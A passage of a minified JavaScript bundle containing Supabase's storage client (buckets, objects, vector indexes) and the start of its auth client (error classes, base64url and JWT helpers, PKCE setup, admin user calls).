Xx(r.fetch,`${r.url}/object/${n}`,{headers:r.headers}),{data:!0,error:null}}catch(l){if(r.shouldThrowOnError)throw l;if(Xe(l)&&l instanceof Pc){const c=l.originalError;if([400,404].includes(c?.status))return{data:!1,error:l}}throw l}}getPublicUrl(a,r){const n=this._getFinalPath(a),l=[],c=r?.download?`download=${r.download===!0?"":r.download}`:"";c!==""&&l.push(c);const u=typeof r?.transform<"u"?"render/image":"object",h=this.transformOptsToQueryString(r?.transform||{});h!==""&&l.push(h);let m=l.join("&");return m!==""&&(m=`?${m}`),{data:{publicUrl:encodeURI(`${this.url}/${u}/public/${n}${m}`)}}}async remove(a){var r=this;try{return{data:await Xc(r.fetch,`${r.url}/object/${r.bucketId}`,{prefixes:a},{headers:r.headers}),error:null}}catch(n){if(r.shouldThrowOnError)throw n;if(Xe(n))return{data:null,error:n};throw n}}async list(a,r,n){var l=this;try{const c=ve(ve(ve({},tg),r),{},{prefix:a||""});return{data:await _r(l.fetch,`${l.url}/object/list/${l.bucketId}`,c,{headers:l.headers},n),error:null}}catch(c){if(l.shouldThrowOnError)throw c;if(Xe(c))return{data:null,error:c};throw c}}async listV2(a,r){var n=this;try{const l=ve({},a);return{data:await _r(n.fetch,`${n.url}/object/list-v2/${n.bucketId}`,l,{headers:n.headers},r),error:null}}catch(l){if(n.shouldThrowOnError)throw l;if(Xe(l))return{data:null,error:l};throw l}}encodeMetadata(a){return JSON.stringify(a)}toBase64(a){return typeof Buffer<"u"?Buffer.from(a).toString("base64"):btoa(a)}_getFinalPath(a){return`${this.bucketId}/${a.replace(/^\/+/,"")}`}_removeEmptyFolders(a){return a.replace(/^\/|\/$/g,"").replace(/\/+/g,"/")}transformOptsToQueryString(a){const r=[];return a.width&&r.push(`width=${a.width}`),a.height&&r.push(`height=${a.height}`),a.resize&&r.push(`resize=${a.resize}`),a.format&&r.push(`format=${a.format}`),a.quality&&r.push(`quality=${a.quality}`),r.join("&")}};const Uf="2.90.1",Lf={"X-Client-Info":`storage-js/${Uf}`};var sg=class{constructor(a,r={},n,l){this.shouldThrowOnError=!1;const c=new URL(a);l?.useNewHostname&&/supabase\.(co|in|red)$/.test(c.hostname)&&!c.hostname.includes("storage.supabase.")&&(c.hostname=c.hostname.replace("supabase.","storage.supabase.")),this.url=c.href.replace(/\/$/,""),this.headers=ve(ve({},Lf),r),this.fetch=Qc(n)}throwOnError(){return this.shouldThrowOnError=!0,this}async listBuckets(a){var r=this;try{const n=r.listBucketOptionsToQueryString(a);return{data:await qa(r.fetch,`${r.url}/bucket${n}`,{headers:r.headers}),error:null}}catch(n){if(r.shouldThrowOnError)throw n;if(Xe(n))return{data:null,error:n};throw n}}async getBucket(a){var r=this;try{return{data:await qa(r.fetch,`${r.url}/bucket/${a}`,{headers:r.headers}),error:null}}catch(n){if(r.shouldThrowOnError)throw n;if(Xe(n))return{data:null,error:n};throw n}}async createBucket(a,r={public:!1}){var n=this;try{return{data:await _r(n.fetch,`${n.url}/bucket`,{id:a,name:a,type:r.type,public:r.public,file_size_limit:r.fileSizeLimit,allowed_mime_types:r.allowedMimeTypes},{headers:n.headers}),error:null}}catch(l){if(n.shouldThrowOnError)throw l;if(Xe(l))return{data:null,error:l};throw l}}async updateBucket(a,r){var n=this;try{return{data:await Oc(n.fetch,`${n.url}/bucket/${a}`,{id:a,name:a,public:r.public,file_size_limit:r.fileSizeLimit,allowed_mime_types:r.allowedMimeTypes},{headers:n.headers}),error:null}}catch(l){if(n.shouldThrowOnError)throw l;if(Xe(l))return{data:null,error:l};throw l}}async emptyBucket(a){var r=this;try{return{data:await _r(r.fetch,`${r.url}/bucket/${a}/empty`,{},{headers:r.headers}),error:null}}catch(n){if(r.shouldThrowOnError)throw n;if(Xe(n))return{data:null,error:n};throw n}}async deleteBucket(a){var r=this;try{return{data:await Xc(r.fetch,`${r.url}/bucket/${a}`,{},{headers:r.headers}),error:null}}catch(n){if(r.shouldThrowOnError)throw n;if(Xe(n))return{data:null,error:n};throw n}}listBucketOptionsToQueryString(a){const r={};return a&&("limit"in a&&(r.limit=String(a.limit)),"offset"in a&&(r.offset=String(a.offset)),a.search&&(r.search=a.search),a.sortColumn&&(r.sortColumn=a.sortColumn),a.sortOrder&&(r.sortOrder=a.sortOrder)),Object.keys(r).length>0?"?"+new URLSearchParams(r).toString():""}},ng=class{constructor(a,r={},n){this.shouldThrowOnError=!1,this.url=a.replace(/\/$/,""),this.headers=ve(ve({},Lf),r),this.fetch=Qc(n)}throwOnError(){return this.shouldThrowOnError=!0,this}async createBucket(a){var r=this;try{return{data:await _r(r.fetch,`${r.url}/bucket`,{name:a},{headers:r.headers}),error:null}}catch(n){if(r.shouldThrowOnError)throw n;if(Xe(n))return{data:null,error:n};throw n}}async listBuckets(a){var r=this;try{const n=new URLSearchParams;a?.limit!==void 0&&n.set("limit",a.limit.toString()),a?.offset!==void 0&&n.set("offset",a.offset.toString()),a?.sortColumn&&n.set("sortColumn",a.sortColumn),a?.sortOrder&&n.set("sortOrder",a.sortOrder),a?.search&&n.set("search",a.search);const l=n.toString(),c=l?`${r.url}/bucket?${l}`:`${r.url}/bucket`;return{data:await qa(r.fetch,c,{headers:r.headers}),error:null}}catch(n){if(r.shouldThrowOnError)throw n;if(Xe(n))return{data:null,error:n};throw n}}async deleteBucket(a){var r=this;try{return{data:await Xc(r.fetch,`${r.url}/bucket/${a}`,{},{headers:r.headers}),error:null}}catch(n){if(r.shouldThrowOnError)throw n;if(Xe(n))return{data:null,error:n};throw n}}from(a){var r=this;if(!Hx(a))throw new _l("Invalid bucket name: File, folder, and bucket names must follow AWS object key naming guidelines and should avoid the use of any other characters.");const n=new Bx({baseUrl:this.url,catalogName:a,auth:{type:"custom",getHeaders:async()=>r.headers},fetch:this.fetch}),l=this.shouldThrowOnError;return new Proxy(n,{get(c,u){const h=c[u];return typeof h!="function"?h:async(...m)=>{try{return{data:await h.apply(c,m),error:null}}catch(x){if(l)throw x;return{data:null,error:x}}}}})}};const Zc={"X-Client-Info":`storage-js/${Uf}`,"Content-Type":"application/json"};var Mf=class extends Error{constructor(a){super(a),this.__isStorageVectorsError=!0,this.name="StorageVectorsError"}};function Qt(a){return typeof a=="object"&&a!==null&&"__isStorageVectorsError"in a}var mc=class extends Mf{constructor(a,r,n){super(a),this.name="StorageVectorsApiError",this.status=r,this.statusCode=n}toJSON(){return{name:this.name,message:this.message,status:this.status,statusCode:this.statusCode}}},ag=class extends Mf{constructor(a,r){super(a),this.name="StorageVectorsUnknownError",this.originalError=r}};const eu=a=>a?(...r)=>a(...r):(...r)=>fetch(...r),ig=a=>{if(typeof a!="object"||a===null)return!1;const r=Object.getPrototypeOf(a);return(r===null||r===Object.prototype||Object.getPrototypeOf(r)===null)&&!(Symbol.toStringTag in a)&&!(Symbol.iterator in a)},Zh=a=>a.msg||a.message||a.error_description||a.error||JSON.stringify(a),lg=async(a,r,n)=>{if(a&&typeof a=="object"&&"status"in a&&"ok"in a&&typeof a.status=="number"&&!n?.noResolveJson){const l=a.status||500,c=a;if(typeof c.json=="function")c.json().then(u=>{const h=u?.statusCode||u?.code||l+"";r(new mc(Zh(u),l,h))}).catch(()=>{const u=l+"";r(new mc(c.statusText||`HTTP ${l} error`,l,u))});else{const u=l+"";r(new mc(c.statusText||`HTTP ${l} error`,l,u))}}else r(new ag(Zh(a),a))},og=(a,r,n,l)=>{const c={method:a,headers:r?.headers||{}};return l?(ig(l)?(c.headers=ve({"Content-Type":"application/json"},r?.headers),c.body=JSON.stringify(l)):c.body=l,ve(ve({},c),n)):c};async function cg(a,r,n,l,c,u){return new Promise((h,m)=>{a(n,og(r,l,c,u)).then(x=>{if(!x.ok)throw x;if(l?.noResolveJson)return x;const y=x.headers.get("content-type");return!y||!y.includes("application/json")?{}:x.json()}).then(x=>h(x)).catch(x=>lg(x,m,l))})}async function Xt(a,r,n,l,c){return cg(a,"POST",r,l,c,n)}var ug=class{constructor(a,r={},n){this.shouldThrowOnError=!1,this.url=a.replace(/\/$/,""),this.headers=ve(ve({},Zc),r),this.fetch=eu(n)}throwOnError(){return this.shouldThrowOnError=!0,this}async createIndex(a){var r=this;try{return{data:await Xt(r.fetch,`${r.url}/CreateIndex`,a,{headers:r.headers})||{},error:null}}catch(n){if(r.shouldThrowOnError)throw n;if(Qt(n))return{data:null,error:n};throw n}}async getIndex(a,r){var n=this;try{return{data:await Xt(n.fetch,`${n.url}/GetIndex`,{vectorBucketName:a,indexName:r},{headers:n.headers}),error:null}}catch(l){if(n.shouldThrowOnError)throw l;if(Qt(l))return{data:null,error:l};throw l}}async listIndexes(a){var r=this;try{return{data:await Xt(r.fetch,`${r.url}/ListIndexes`,a,{headers:r.headers}),error:null}}catch(n){if(r.shouldThrowOnError)throw n;if(Qt(n))return{data:null,error:n};throw n}}async deleteIndex(a,r){var n=this;try{return{data:await Xt(n.fetch,`${n.url}/DeleteIndex`,{vectorBucketName:a,indexName:r},{headers:n.headers})||{},error:null}}catch(l){if(n.shouldThrowOnError)throw l;if(Qt(l))return{data:null,error:l};throw l}}},dg=class{constructor(a,r={},n){this.shouldThrowOnError=!1,this.url=a.replace(/\/$/,""),this.headers=ve(ve({},Zc),r),this.fetch=eu(n)}throwOnError(){return this.shouldThrowOnError=!0,this}async putVectors(a){var r=this;try{if(a.vectors.length<1||a.vectors.length>500)throw new Error("Vector batch size must be between 1 and 500 items");return{data:await Xt(r.fetch,`${r.url}/PutVectors`,a,{headers:r.headers})||{},error:null}}catch(n){if(r.shouldThrowOnError)throw n;if(Qt(n))return{data:null,error:n};throw n}}async getVectors(a){var r=this;try{return{data:await Xt(r.fetch,`${r.url}/GetVectors`,a,{headers:r.headers}),error:null}}catch(n){if(r.shouldThrowOnError)throw n;if(Qt(n))return{data:null,error:n};throw n}}async listVectors(a){var r=this;try{if(a.segmentCount!==void 0){if(a.segmentCount<1||a.segmentCount>16)throw new Error("segmentCount must be between 1 and 16");if(a.segmentIndex!==void 0&&(a.segmentIndex<0||a.segmentIndex>=a.segmentCount))throw new Error(`segmentIndex must be between 0 and ${a.segmentCount-1}`)}return{data:await Xt(r.fetch,`${r.url}/ListVectors`,a,{headers:r.headers}),error:null}}catch(n){if(r.shouldThrowOnError)throw n;if(Qt(n))return{data:null,error:n};throw n}}async queryVectors(a){var r=this;try{return{data:await Xt(r.fetch,`${r.url}/QueryVectors`,a,{headers:r.headers}),error:null}}catch(n){if(r.shouldThrowOnError)throw n;if(Qt(n))return{data:null,error:n};throw n}}async deleteVectors(a){var r=this;try{if(a.keys.length<1||a.keys.length>500)throw new Error("Keys batch size must be between 1 and 500 items");return{data:await Xt(r.fetch,`${r.url}/DeleteVectors`,a,{headers:r.headers})||{},error:null}}catch(n){if(r.shouldThrowOnError)throw n;if(Qt(n))return{data:null,error:n};throw n}}},hg=class{constructor(a,r={},n){this.shouldThrowOnError=!1,this.url=a.replace(/\/$/,""),this.headers=ve(ve({},Zc),r),this.fetch=eu(n)}throwOnError(){return this.shouldThrowOnError=!0,this}async createBucket(a){var r=this;try{return{data:await Xt(r.fetch,`${r.url}/CreateVectorBucket`,{vectorBucketName:a},{headers:r.headers})||{},error:null}}catch(n){if(r.shouldThrowOnError)throw n;if(Qt(n))return{data:null,error:n};throw n}}async getBucket(a){var r=this;try{return{data:await Xt(r.fetch,`${r.url}/GetVectorBucket`,{vectorBucketName:a},{headers:r.headers}),error:null}}catch(n){if(r.shouldThrowOnError)throw n;if(Qt(n))return{data:null,error:n};throw n}}async listBuckets(a={}){var r=this;try{return{data:await Xt(r.fetch,`${r.url}/ListVectorBuckets`,a,{headers:r.headers}),error:null}}catch(n){if(r.shouldThrowOnError)throw n;if(Qt(n))return{data:null,error:n};throw n}}async deleteBucket(a){var r=this;try{return{data:await Xt(r.fetch,`${r.url}/DeleteVectorBucket`,{vectorBucketName:a},{headers:r.headers})||{},error:null}}catch(n){if(r.shouldThrowOnError)throw n;if(Qt(n))return{data:null,error:n};throw n}}},fg=class extends hg{constructor(a,r={}){super(a,r.headers||{},r.fetch)}from(a){return new pg(this.url,this.headers,a,this.fetch)}async createBucket(a){var r=()=>super.createBucket,n=this;return r().call(n,a)}async getBucket(a){var r=()=>super.getBucket,n=this;return r().call(n,a)}async listBuckets(a={}){var r=()=>super.listBuckets,n=this;return r().call(n,a)}async deleteBucket(a){var r=()=>super.deleteBucket,n=this;return r().call(n,a)}},pg=class extends ug{constructor(a,r,n,l){super(a,r,l),this.vectorBucketName=n}async createIndex(a){var r=()=>super.createIndex,n=this;return r().call(n,ve(ve({},a),{},{vectorBucketName:n.vectorBucketName}))}async listIndexes(a={}){var r=()=>super.listIndexes,n=this;return r().call(n,ve(ve({},a),{},{vectorBucketName:n.vectorBucketName}))}async getIndex(a){var r=()=>super.getIndex,n=this;return r().call(n,n.vectorBucketName,a)}async deleteIndex(a){var r=()=>super.deleteIndex,n=this;return r().call(n,n.vectorBucketName,a)}index(a){return new mg(this.url,this.headers,this.vectorBucketName,a,this.fetch)}},mg=class extends dg{constructor(a,r,n,l,c){super(a,r,c),this.vectorBucketName=n,this.indexName=l}async putVectors(a){var r=()=>super.putVectors,n=this;return r().call(n,ve(ve({},a),{},{vectorBucketName:n.vectorBucketName,indexName:n.indexName}))}async getVectors(a){var r=()=>super.getVectors,n=this;return r().call(n,ve(ve({},a),{},{vectorBucketName:n.vectorBucketName,indexName:n.indexName}))}async listVectors(a={}){var r=()=>super.listVectors,n=this;return r().call(n,ve(ve({},a),{},{vectorBucketName:n.vectorBucketName,indexName:n.indexName}))}async queryVectors(a){var r=()=>super.queryVectors,n=this;return r().call(n,ve(ve({},a),{},{vectorBucketName:n.vectorBucketName,indexName:n.indexName}))}async deleteVectors(a){var r=()=>super.deleteVectors,n=this;return r().call(n,ve(ve({},a),{},{vectorBucketName:n.vectorBucketName,indexName:n.indexName}))}},xg=class extends sg{constructor(a,r={},n,l){super(a,r,n,l)}from(a){return new rg(this.url,this.headers,a,this.fetch)}get vectors(){return new fg(this.url+"/vector",{headers:this.headers,fetch:this.fetch})}get analytics(){return new ng(this.url+"/iceberg",this.headers,this.fetch)}};const Ff="2.90.1",Mn=30*1e3,Ic=3,xc=Ic*Mn,gg="http://localhost:9999",yg="supabase.auth.token",vg={"X-Client-Info":`gotrue-js/${Ff}`},$c="X-Supabase-Api-Version",Bf={"2024-01-01":{timestamp:Date.parse("2024-01-01T00:00:00.0Z"),name:"2024-01-01"}},wg=/^([a-z0-9_-]{4})*($|[a-z0-9_-]{3}$|[a-z0-9_-]{2}$)$/i,bg=600*1e3;class Va extends Error{constructor(r,n,l){super(r),this.__isAuthError=!0,this.name="AuthError",this.status=n,this.code=l}}function ce(a){return typeof a=="object"&&a!==null&&"__isAuthError"in a}class jg extends Va{constructor(r,n,l){super(r,n,l),this.name="AuthApiError",this.status=n,this.code=l}}function kg(a){return ce(a)&&a.name==="AuthApiError"}class sn extends Va{constructor(r,n){super(r),this.name="AuthUnknownError",this.originalError=n}}class ls extends Va{constructor(r,n,l,c){super(r,l,c),this.name=n,this.status=l}}class Yt extends ls{constructor(){super("Auth session missing!","AuthSessionMissingError",400,void 0)}}function _g(a){return ce(a)&&a.name==="AuthSessionMissingError"}class In extends ls{constructor(){super("Auth session or user missing","AuthInvalidTokenResponseError",500,void 0)}}class rl extends ls{constructor(r){super(r,"AuthInvalidCredentialsError",400,void 0)}}class sl extends ls{constructor(r,n=null){super(r,"AuthImplicitGrantRedirectError",500,void 0),this.details=null,this.details=n}toJSON(){return{name:this.name,message:this.message,status:this.status,details:this.details}}}function Ng(a){return ce(a)&&a.name==="AuthImplicitGrantRedirectError"}class ef extends ls{constructor(r,n=null){super(r,"AuthPKCEGrantCodeExchangeError",500,void 0),this.details=null,this.details=n}toJSON(){return{name:this.name,message:this.message,status:this.status,details:this.details}}}class Sg extends ls{constructor(){super("PKCE code verifier not found in storage. This can happen if the auth flow was initiated in a different browser or device, or if the storage was cleared. For SSR frameworks (Next.js, SvelteKit, etc.), use @supabase/ssr on both the server and client to store the code verifier in cookies.","AuthPKCECodeVerifierMissingError",400,"pkce_code_verifier_not_found")}}class Dc extends ls{constructor(r,n){super(r,"AuthRetryableFetchError",n,void 0)}}function gc(a){return ce(a)&&a.name==="AuthRetryableFetchError"}class tf extends ls{constructor(r,n,l){super(r,"AuthWeakPasswordError",n,"weak_password"),this.reasons=l}}class zc extends ls{constructor(r){super(r,"AuthInvalidJwtError",400,"invalid_jwt")}}const xl="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_".split(""),rf=` 	
\r=`.split(""),Eg=(()=>{const a=new Array(128);for(let r=0;r<a.length;r+=1)a[r]=-1;for(let r=0;r<rf.length;r+=1)a[rf[r].charCodeAt(0)]=-2;for(let r=0;r<xl.length;r+=1)a[xl[r].charCodeAt(0)]=r;return a})();function sf(a,r,n){if(a!==null)for(r.queue=r.queue<<8|a,r.queuedBits+=8;r.queuedBits>=6;){const l=r.queue>>r.queuedBits-6&63;n(xl[l]),r.queuedBits-=6}else if(r.queuedBits>0)for(r.queue=r.queue<<6-r.queuedBits,r.queuedBits=6;r.queuedBits>=6;){const l=r.queue>>r.queuedBits-6&63;n(xl[l]),r.queuedBits-=6}}function Wf(a,r,n){const l=Eg[a];if(l>-1)for(r.queue=r.queue<<6|l,r.queuedBits+=6;r.queuedBits>=8;)n(r.queue>>r.queuedBits-8&255),r.queuedBits-=8;else{if(l===-2)return;throw new Error(`Invalid Base64-URL character "${String.fromCharCode(a)}"`)}}function nf(a){const r=[],n=h=>{r.push(String.fromCodePoint(h))},l={utf8seq:0,codepoint:0},c={queue:0,queuedBits:0},u=h=>{Rg(h,l,n)};for(let h=0;h<a.length;h+=1)Wf(a.charCodeAt(h),c,u);return r.join("")}function Cg(a,r){if(a<=127){r(a);return}else if(a<=2047){r(192|a>>6),r(128|a&63);return}else if(a<=65535){r(224|a>>12),r(128|a>>6&63),r(128|a&63);return}else if(a<=1114111){r(240|a>>18),r(128|a>>12&63),r(128|a>>6&63),r(128|a&63);return}throw new Error(`Unrecognized Unicode codepoint: ${a.toString(16)}`)}function Tg(a,r){for(let n=0;n<a.length;n+=1){let l=a.charCodeAt(n);if(l>55295&&l<=56319){const c=(l-55296)*1024&65535;l=(a.charCodeAt(n+1)-56320&65535|c)+65536,n+=1}Cg(l,r)}}function Rg(a,r,n){if(r.utf8seq===0){if(a<=127){n(a);return}for(let l=1;l<6;l+=1)if((a>>7-l&1)===0){r.utf8seq=l;break}if(r.utf8seq===2)r.codepoint=a&31;else if(r.utf8seq===3)r.codepoint=a&15;else if(r.utf8seq===4)r.codepoint=a&7;else throw new Error("Invalid UTF-8 sequence");r.utf8seq-=1}else if(r.utf8seq>0){if(a<=127)throw new Error("Invalid UTF-8 sequence");r.codepoint=r.codepoint<<6|a&63,r.utf8seq-=1,r.utf8seq===0&&n(r.codepoint)}}function Wn(a){const r=[],n={queue:0,queuedBits:0},l=c=>{r.push(c)};for(let c=0;c<a.length;c+=1)Wf(a.charCodeAt(c),n,l);return new Uint8Array(r)}function Pg(a){const r=[];return Tg(a,n=>r.push(n)),new Uint8Array(r)}function nn(a){const r=[],n={queue:0,queuedBits:0},l=c=>{r.push(c)};return a.forEach(c=>sf(c,n,l)),sf(null,n,l),r.join("")}function Ag(a){return Math.round(Date.now()/1e3)+a}function Og(){return Symbol("auth-callback")}const bt=()=>typeof window<"u"&&typeof document<"u",Zs={tested:!1,writable:!1},qf=()=>{if(!bt())return!1;try{if(typeof globalThis.localStorage!="object")return!1}catch{return!1}if(Zs.tested)return Zs.writable;const a=`lswt-${Math.random()}${Math.random()}`;try{globalThis.localStorage.setItem(a,a),globalThis.localStorage.removeItem(a),Zs.tested=!0,Zs.writable=!0}catch{Zs.tested=!0,Zs.writable=!1}return Zs.writable};function Ig(a){const r={},n=new URL(a);if(n.hash&&n.hash[0]==="#")try{new URLSearchParams(n.hash.substring(1)).forEach((c,u)=>{r[u]=c})}catch{}return n.searchParams.forEach((l,c)=>{r[c]=l}),r}const Vf=a=>a?(...r)=>a(...r):(...r)=>fetch(...r),$g=a=>typeof a=="object"&&a!==null&&"status"in a&&"ok"in a&&"json"in a&&typeof a.json=="function",Fn=async(a,r,n)=>{await a.setItem(r,JSON.stringify(n))},en=async(a,r)=>{const n=await a.getItem(r);if(!n)return null;try{return JSON.parse(n)}catch{return n}},wt=async(a,r)=>{await a.removeItem(r)};class Nl{constructor(){this.promise=new Nl.promiseConstructor((r,n)=>{this.resolve=r,this.reject=n})}}Nl.promiseConstructor=Promise;function yc(a){const r=a.split(".");if(r.length!==3)throw new zc("Invalid JWT structure");for(let l=0;l<r.length;l++)if(!wg.test(r[l]))throw new zc("JWT not in base64url format");return{header:JSON.parse(nf(r[0])),payload:JSON.parse(nf(r[1])),signature:Wn(r[2]),raw:{header:r[0],payload:r[1]}}}async function Dg(a){return await new Promise(r=>{setTimeout(()=>r(null),a)})}function zg(a,r){return new Promise((l,c)=>{(async()=>{for(let u=0;u<1/0;u++)try{const h=await a(u);if(!r(u,null,h)){l(h);return}}catch(h){if(!r(u,h)){c(h);return}}})()})}function Ug(a){return("0"+a.toString(16)).substr(-2)}function Lg(){const r=new Uint32Array(56);if(typeof crypto>"u"){const n="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~",l=n.length;let c="";for(let u=0;u<56;u++)c+=n.charAt(Math.floor(Math.random()*l));return c}return crypto.getRandomValues(r),Array.from(r,Ug).join("")}async function Mg(a){const n=new TextEncoder().encode(a),l=await crypto.subtle.digest("SHA-256",n),c=new Uint8Array(l);return Array.from(c).map(u=>String.fromCharCode(u)).join("")}async function Fg(a){if(!(typeof crypto<"u"&&typeof crypto.subtle<"u"&&typeof TextEncoder<"u"))return console.warn("WebCrypto API is not supported. Code challenge method will default to use plain instead of sha256."),a;const n=await Mg(a);return btoa(n).replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"")}async function $n(a,r,n=!1){const l=Lg();let c=l;n&&(c+="/PASSWORD_RECOVERY"),await Fn(a,`${r}-code-verifier`,c);const u=await Fg(l);return[u,l===u?"plain":"s256"]}const Bg=/^2[0-9]{3}-(0[1-9]|1[0-2])-(0[1-9]|1[0-9]|2[0-9]|3[0-1])$/i;function Wg(a){const r=a.headers.get($c);if(!r||!r.match(Bg))return null;try{return new Date(`${r}T00:00:00.0Z`)}catch{return null}}function qg(a){if(!a)throw new Error("Missing exp claim");const r=Math.floor(Date.now()/1e3);if(a<=r)throw new Error("JWT has expired")}function Vg(a){switch(a){case"RS256":return{name:"RSASSA-PKCS1-v1_5",hash:{name:"SHA-256"}};case"ES256":return{name:"ECDSA",namedCurve:"P-256",hash:{name:"SHA-256"}};default:throw new Error("Invalid alg claim")}}const Hg=/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;function Dn(a){if(!Hg.test(a))throw new Error("@supabase/auth-js: Expected parameter to be UUID but is not")}function vc(){const a={};return new Proxy(a,{get:(r,n)=>{if(n==="__isUserNotAvailableProxy")return!0;if(typeof n=="symbol"){const l=n.toString();if(l==="Symbol(Symbol.toPrimitive)"||l==="Symbol(Symbol.toStringTag)"||l==="Symbol(util.inspect.custom)")return}throw new Error(`@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Accessing the "${n}" property of the session object is not supported. Please use getUser() instead.`)},set:(r,n)=>{throw new Error(`@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Setting the "${n}" property of the session object is not supported. Please use getUser() to fetch a user object you can manipulate.`)},deleteProperty:(r,n)=>{throw new Error(`@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Deleting the "${n}" property of the session object is not supported. Please use getUser() to fetch a user object you can manipulate.`)}})}function Kg(a,r){return new Proxy(a,{get:(n,l,c)=>{if(l==="__isInsecureUserWarningProxy")return!0;if(typeof l=="symbol"){const u=l.toString();if(u==="Symbol(Symbol.toPrimitive)"||u==="Symbol(Symbol.toStringTag)"||u==="Symbol(util.inspect.custom)"||u==="Symbol(nodejs.util.inspect.custom)")return Reflect.get(n,l,c)}return!r.value&&typeof l=="string"&&(console.warn("Using the user object as returned from supabase.auth.getSession() or from some supabase.auth.onAuthStateChange() events could be insecure! This value comes directly from the storage medium (usually cookies on the server) and may not be authentic. Use supabase.auth.getUser() instead which authenticates the data by contacting the Supabase Auth server."),r.value=!0),Reflect.get(n,l,c)}})}function af(a){return JSON.parse(JSON.stringify(a))}const tn=a=>a.msg||a.message||a.error_description||a.error||JSON.stringify(a),Gg=[502,503,504];async function lf(a){var r;if(!$g(a))throw new Dc(tn(a),0);if(Gg.includes(a.status))throw new Dc(tn(a),a.status);let n;try{n=await a.json()}catch(u){throw new sn(tn(u),u)}let l;const c=Wg(a);if(c&&c.getTime()>=Bf["2024-01-01"].timestamp&&typeof n=="object"&&n&&typeof n.code=="string"?l=n.code:typeof n=="object"&&n&&typeof n.error_code=="string"&&(l=n.error_code),l){if(l==="weak_password")throw new tf(tn(n),a.status,((r=n.weak_password)===null||r===void 0?void 0:r.reasons)||[]);if(l==="session_not_found")throw new Yt}else if(typeof n=="object"&&n&&typeof n.weak_password=="object"&&n.weak_password&&Array.isArray(n.weak_password.reasons)&&n.weak_password.reasons.length&&n.weak_password.reasons.reduce((u,h)=>u&&typeof h=="string",!0))throw new tf(tn(n),a.status,n.weak_password.reasons);throw new jg(tn(n),a.status||500,l)}const Jg=(a,r,n,l)=>{const c={method:a,headers:r?.headers||{}};return a==="GET"?c:(c.headers=Object.assign({"Content-Type":"application/json;charset=UTF-8"},r?.headers),c.body=JSON.stringify(l),Object.assign(Object.assign({},c),n))};async function ye(a,r,n,l){var c;const u=Object.assign({},l?.headers);u[$c]||(u[$c]=Bf["2024-01-01"].name),l?.jwt&&(u.Authorization=`Bearer ${l.jwt}`);const h=(c=l?.query)!==null&&c!==void 0?c:{};l?.redirectTo&&(h.redirect_to=l.redirectTo);const m=Object.keys(h).length?"?"+new URLSearchParams(h).toString():"",x=await Yg(a,r,n+m,{headers:u,noResolveJson:l?.noResolveJson},{},l?.body);return l?.xform?l?.xform(x):{data:Object.assign({},x),error:null}}async function Yg(a,r,n,l,c,u){const h=Jg(r,l,c,u);let m;try{m=await a(n,Object.assign({},h))}catch(x){throw console.error(x),new Dc(tn(x),0)}if(m.ok||await lf(m),l?.noResolveJson)return m;try{return await m.json()}catch(x){await lf(x)}}function kr(a){var r;let n=null;Zg(a)&&(n=Object.assign({},a),a.expires_at||(n.expires_at=Ag(a.expires_in)));const l=(r=a.user)!==null&&r!==void 0?r:a;return{data:{session:n,user:l},error:null}}function of(a){const r=kr(a);return!r.error&&a.weak_password&&typeof a.weak_password=="object"&&Array.isArray(a.weak_password.reasons)&&a.weak_password.reasons.length&&a.weak_password.message&&typeof a.weak_password.message=="string"&&a.weak_password.reasons.reduce((n,l)=>n&&typeof l=="string",!0)&&(r.data.weak_password=a.weak_password),r}function Ps(a){var r;return{data:{user:(r=a.user)!==null&&r!==void 0?r:a},error:null}}function Qg(a){return{data:a,error:null}}function Xg(a){const{action_link:r,email_otp:n,hashed_token:l,redirect_to:c,verification_type:u}=a,h=kl(a,["action_link","email_otp","hashed_token","redirect_to","verification_type"]),m={action_link:r,email_otp:n,hashed_token:l,redirect_to:c,verification_type:u},x=Object.assign({},h);return{data:{properties:m,user:x},error:null}}function cf(a){return a}function Zg(a){return a.access_token&&a.refresh_token&&a.expires_in}const wc=["global","local","others"];class ey{constructor({url:r="",headers:n={},fetch:l}){this.url=r,this.headers=n,this.fetch=Vf(l),this.mfa={listFactors:this._listFactors.bind(this),deleteFactor:this._deleteFactor.bind(this)},this.oauth={listClients:this._listOAuthClients.bind(this),createClient:this._createOAuthClient.bind(this),getClient:this._getOAuthClient.bind(this),updateClient:this._updateOAuthClient.bind(this),deleteClient:this._deleteOAuthClient.bind(this),regenerateClientSecret:this._regenerateOAuthClientSecret.bind(this)}}async signOut(r,n=wc[0]){if(wc.indexOf(n)<0)throw new Error(`@supabase/auth-js: Parameter scope must be one of ${wc.join(", ")}`);try{return await ye(this.fetch,"POST",`${this.url}/logout?scope=${n}`,{headers:this.headers,jwt:r,noResolveJson:!0}),{data:null,error:null}}catch(l){if(ce(l))return{data:null,error:l};throw l}}async inviteUserByEmail(r,n={}){try{return await ye(this.fetch,"POST",`${this.url}/invite`,{body:{email:r,data:n.data},headers:this.headers,redirectTo:n.redirectTo,xform:Ps})}catch(l){if(ce(l))return{data:{user:null},error:l};throw l}}async generateLink(r){try{const{options:n}=r,l=kl(r,["options"]),c=Object.assign(Object.assign({},l),n);return"newEmail"in l&&(c.new_email=l?.newEmail,delete c.newEmail),await ye(this.fetch,"POST",`${this.url}/admin/generate_link`,{body:c,headers:this.headers,xform:Xg,redirectTo:n?.redirectTo})}catch(n){if(ce(n))return{data:{properties:null,user:null},error:n};throw n}}async createUser(r){try{return await ye(this.fetch,"POST",`${this.url}/admin/users`,{body:r,headers:this.headers,xform:Ps})}catch(n){if(ce(n))return{data:{user:null},error:n};throw n}}async listUsers(r){var n,l,c,u,h,m,x;try{const y={nextPage:null,lastPage:0,total:0},v=await ye(this.fetch,"GET",`${this.url}/admin/users`,{headers:this.headers,noResolveJson:!0,query:{page:(l=(n=r?.page)===null||n===void 0?void 0:n.toString())!==null&&l!==void 0?l:"",per_page:(u=(c=r?.perPage)===null||c===void 0?void 0:c.toString())!==null&&u!==void 0?u:""},xform:cf});if(v.error)throw v.error;const k=await v.json(),_=(h=v.headers.get("x-total-count"))!==null&&h!==void 0?h:0,S=(x=(m=v.headers.get("link"))===null||m===void 0?void 